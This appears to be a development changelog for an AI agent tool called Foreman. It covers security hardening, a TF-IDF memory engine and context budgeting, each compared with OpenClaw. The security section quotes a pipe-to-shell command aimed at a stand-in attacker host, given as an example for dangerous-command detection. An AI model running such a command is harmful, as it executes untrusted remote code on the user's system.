## BLOK 2: Security Hardening (Beyond OpenClaw) — ✅ COMPLETE (commit `f90192f`)

### What was done
Foreman now EXCEEDS OpenClaw in 5 areas:

1. **Env Injection Blocking** (`validateEnv`):
   - OpenClaw blocks LD_PRELOAD/NODE_OPTIONS only on non-sandbox hosts
   - Foreman blocks ALWAYS: 15 dangerous vars + 2 prefix patterns (DYLD_*, LD_*) + PATH
   - Prevents LLM hallucination-based env injection attacks

2. **Binary Output Sanitization** (`sanitizeBinaryOutput`):
   - OpenClaw strips Format/Surrogate unicode + control chars < 0x20
   - Foreman ALSO strips ANSI escape sequences (CSI, OSC color codes, cursor moves)
   - Critical for cheap model performance — ANSI wastes tokens and confuses models

3. **Output Accumulation Guard** (MAX_OUTPUT_ACCUMULATE = 512KB):
   - OpenClaw has no hard cap on in-memory output buffering
   - Foreman caps at 512KB to prevent OOM from runaway build output
   - Combined with truncateMiddle, start errors + end summary always preserved

4. **Regex Dangerous Command Detection** (DANGEROUS_PIPE_RX):
   - OpenClaw uses string matching
   - Foreman uses regex patterns: catches `curl http://evil.com | bash` that string matching misses

5. **tools.ts Factory Pattern** (`createToolExecutor`):
   - OpenClaw has monolithic tool→engine coupling
   - Foreman uses clean factory: `createToolExecutor(projectRoot)` returns tool handler
   - Legacy `executeTool()` preserved for backward compat

  2. **Task branching**: `foreman/<type>/<slug>` naming, auto-sanitization, dirty-tree guards, Foreman-only deletion safety

## BLOK 5: Memory Deepening — ✅ COMPLETE (commit `e0b3828`)

### What was done
1. **Similarity Engine** (`src/similarity-engine.ts`, ~320 LOC):
   - TF-IDF vectorizer with IDF weighting across document corpus
   - Code-aware tokenizer: camelCase/snake_case splitting, compound token preservation
   - Cosine similarity on sparse TF-IDF vectors
   - Character n-gram (trigram) Jaccard similarity
   - Composite scoring: 0.7 * TF-IDF + 0.3 * n-gram
   - Dedup detection with string-overlap-weighted scoring
   - Zero API calls, zero cost, offline-capable

2. **Memory Manager upgrade** (`src/memory-manager.ts`):
   - `search()` replaced keyword Jaccard with TF-IDF + n-gram + importance/recency/category boosting
   - `findSimilar()` now uses SimilarityEngine instead of naive first-80-char comparison
   - `buildSimilarityEngine()` helper indexes all entries for search/dedup

3. **Memory Consolidation** (new):
   - `consolidate(threshold)` merges near-duplicate memories automatically
   - Keeps higher-importance entry, combines tags + use counts, expires loser
   - OpenClaw has no consolidation

4. **Cross-Project Import** (new):
   - `importFromProject(sourceRoot, threshold)` transfers high-value patterns
   - Only transferable categories: lesson, pattern, error, constraint
   - Duplicate protection via similarity check, 20% importance discount
   - OpenClaw has no cross-project memory

### Key decisions
- Local TF-IDF over external embeddings: Foreman's mission is making cheap models work — API costs for embeddings defeat the purpose
- TF-IDF with proper IDF captures domain terminology better than generic embeddings for code content

## BLOK 6: Context Intelligence — ✅ COMPLETE (commit `23952aa`)

### What was done
`src/context-intelligence.ts` (~400 LOC) — 5 capabilities that EXCEED OpenClaw:

1. **Layer-Aware Budget Allocation**:
   - OpenClaw: same budget for all messages
   - Foreman: visioner 40%, strategist 30%, researcher 15%, worker 15%
   - Strategic decisions need more context than tactical ones

2. **Thought Relevance Scoring** (not FIFO):
   - OpenClaw: drops oldest first
   - Foreman scores by: semantic similarity (TF-IDF, 35%) + recency (exponential decay, 35%) + confidence (15%) + layer affinity (10%) + base (5%)
   - Old but relevant thoughts stay in context

3. **Progressive 3-Tier Summarization** (no LLM needed):
   - OpenClaw: binary (full or LLM summary)
   - Foreman: full → condensed → headline, deterministic, zero cost
   - Full: ~500 tokens (input+reasoning+output+protocol)
   - Condensed: ~50 tokens (input+output snippet)
   - Headline: ~15 tokens (one line)

4. **Decision Anchoring**:
   - High-confidence (≥0.85) done thoughts NEVER dropped regardless of age
   - Score=1.0, tier=full always
   - OpenClaw drops everything by position

5. **Cross-Chain Context**:
   - `extractCrossChainContext()` uses similarity to find relevant parent chain thoughts
   - Worker chain about "user login API" gets strategist's API design, not DB schema
   - OpenClaw has no chain hierarchy awareness

### Tier downgrade mechanism
- When budget is tight, thoughts auto-downgrade: full→condensed→headline
- `downgrade()` function tries cheaper tier before excluding entirely
